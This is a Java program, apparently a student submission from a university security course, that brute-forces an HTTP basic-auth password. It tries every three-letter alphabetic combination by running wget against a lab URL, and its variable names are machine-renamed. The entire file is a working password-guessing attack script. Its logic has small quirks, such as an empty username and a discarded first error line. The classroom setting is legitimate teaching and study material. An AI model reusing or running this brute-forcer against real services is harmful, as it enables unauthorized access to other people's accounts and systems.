import java.io.*;
import java.awt.*;
import java.net.*;
public class BruteForce {
    public static void main ( String[] v0 ) {
        String v1;
        v1 = new String();
        v1 = m00 ();
        System.out.println ( "Password is: " + v1 );
    }
    public static String m00() {
        String v2;
        v2 = new String();
        v2 = "AAA";
        char[] v3;
        v3 = v2.toCharArray();
        Process v4;
        v4 = null;
        Runtime v5;
        v5 = Runtime.getRuntime();
        BufferedReader v6;
        v6 = null;
        String v7;
        v7 = null;
        boolean v8;
        v8 = true;
        System.out.println ( " attacking....." );
        int v9;
        v9 = 65;
        while ( v9 <= 122 ) {
            v3[0] = ( char ) ( v9 );
            int v10;
            v10 = 65;
            while ( v10 <= 122 ) {
                v3[1] = ( char ) ( v10 );
                int v11;
                v11 = 65;
                while ( v11 <= 122 ) {
                    v3[2] = ( char ) ( v11 );
                    v2 = new String ( v3 );
                    String v12;
                    v12 = "wget --http-user= --http-passwd=" + v2
                          + " http://sec-crack.cs.rmit.edu./SEC/2/index.php ";
                    try {
                        v4 = v5.exec ( v12 );
                        v6 = new BufferedReader ( new InputStreamReader (
                                                      v4.getErrorStream() ) );
                        v8 = true;
                        if ( ( v7 = v6.readLine() ) != null ) {
                            for ( ; ( v7 = v6.readLine() ) != null; ) {
                                if ( v7.endsWith ( "Required" ) ) {
                                    v8 = false;
                                }
                            }
                            if ( v8 == true ) {
                                return v2;
                            }
                        }
                    } catch ( Exception v13 ) {
                        v13.getMessage();
                    }
                    if ( v11 == 90 ) {
                        v11 = 96;
                    }
                    v5.gc();
                    v11 = v11 + 1;
                }
                if ( v10 == 90 ) {
                    v10 = 96;
                }
                v10 = v10 + 1;
            }
            if ( v9 == 90 ) {
                v9 = 96;
            }
            v9 = v9 + 1;
        }
        return "not found";
    }
}
